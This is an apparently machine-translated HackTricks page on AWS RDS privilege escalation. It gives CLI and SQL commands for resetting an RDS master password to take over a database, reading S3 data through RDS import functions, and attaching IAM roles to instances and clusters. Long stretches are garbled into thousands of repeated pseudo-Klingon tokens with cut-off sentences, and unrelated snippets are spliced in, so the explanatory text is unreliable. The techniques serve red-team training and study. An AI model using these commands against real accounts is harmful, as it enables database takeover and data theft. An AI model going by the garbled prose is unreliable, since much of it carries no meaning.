# AWS - RDS Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a><strong>DaH jImej</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## RDS - Relational Database Service

For more information about RDS check:

{% content-ref url="../aws-services/aws-databases/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-databases/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

With that permission an attacker can **modify the password of the master user**, and the login inside the database:
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
**Qapla'!** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **Qa
```sql
SELECT * FROM pg_extension;
```
**`aws s3 cp s3://bucket-name/file.txt .`**

If you have **write permissions** on the bucket, you can **upload a file** to it using:

**`aws s3 cp file.txt s3://bucket-name/`**

Remember that **AWS RDS** is a **managed database service** provided by **Amazon Web Services**. It allows you to **run relational databases** in the cloud.
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
**raw AWS credentials**-vam vItlhutlh S3 data vItlhutlh.
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **jatlhpu' 'ejwI'vam vItlhutlh** S3 qel.
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
mysql, 'ej **`SELECT User, Host FROM mysql.user;`** query run 'ej **`rdsadmin`** user, **AWS RDS mysql db** vItlhutlh.
{% endhint %}

mysql 'ej **`show variables;`** run 'ej **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`** variables, vItlhutlh, S3 data vItlhutlh.

'ej, **`aws rds describe-db-clusters`** run permissions vItlhutlh, **associated role** cluster vItlhutlh, AWS services vItlhutlh).

vaj, **bucket vItlhutlh file vItlhutlh** vItlhutlh, path full vItlhutlh. vItlhutlh:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

**rds:AddRoleToDBCluster** `rds:AddRoleToDBCluster` **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Qa'legh**: RDS qutlh nuqDaq 'ej RDS qutlh vItlhutlhlu'chugh **IAM role** 'e' vItlhutlhlu'. 'ach vaj 'oH vItlhutlhlu'chugh, 'ach vItlhutlhlu'chugh vItlhutlhlu'chugh 'ej vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlhlu'chugh vItlhutlh
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: Test
{% endhint %}

An attacker with the permissions `rds:CreateDBInstance` and `iam:PassRole` can **create a new RDS instance with a specified role attached**. The attacker can then potentially **access sensitive data** or modify the data within the instance.

{% hint style="warning" %}
Some requirements of the role/instance-profile to attach (from [**here**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

* The profile must exist in your account.
* The profile must have an IAM role that Amazon EC2 has permissions to assume.
* The instance profile name and the associated IAM role name must start with the prefix `AWSRDSCustom` .
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**Potential Impact**: Access to sensitive data or unauthorized modifications to the data in the RDS instance.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

An attacker with the permissions `rds:AddRoleToDBInstance` and `iam:PassRole` can **add a specified role to an existing RDS instance**. This could allow the attacker to **access sensitive data** or modify the data within the instance.

{% hint style="warning" %}
The DB instance must be outside of a cluster for this
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**Potential Impact**: Access to sensitive data or unauthorized modifications to the data in the RDS instance.

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
